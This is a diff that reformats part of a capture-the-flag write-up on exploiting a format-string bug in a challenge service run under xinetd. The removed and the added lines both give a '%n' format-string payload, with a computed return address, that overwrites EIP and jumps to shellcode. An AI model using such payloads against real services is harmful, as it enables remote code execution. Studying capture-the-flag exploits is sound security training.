@@ -89,12 +89,7 @@ So if we can point old_ebp to 4 bytes before an address holding the address we w
 
 >AAAA%44840317x%44840317x%44840318x%n
 
-To overwrite EIP with 0x41414141. Now for the final part we need to put our shellcode in our buffer and overwrite EIP with the address of our shellcode:
-
->eip_overwrite = (0x0804A080 + n)
->where n is the length of the FMS exploit (36 bytes)
->so eip_overwrite = 0x0804A0A4
->fms exploit: \xA4\xA0\x04\x08%44840317x%44840317x%44840318x%n<shellcode>
+To overwrite EIP with 0x41414141. Now for the final part we need to put our shellcode in our buffer and overwrite EIP with the address of our shellcode. eip_overwrite = (0x0804A080 + n) where n is the length of the FMS exploit (36 bytes) so eip_overwrite = 0x0804A0A4 giving the fms exploit: \xA4\xA0\x04\x08%44840317x%44840317x%44840318x%n<shellcode>
 
 Note that we will need to keep our original socket open in order to prevent xinetd (which is running the challenge) from killing the exploited process.
 
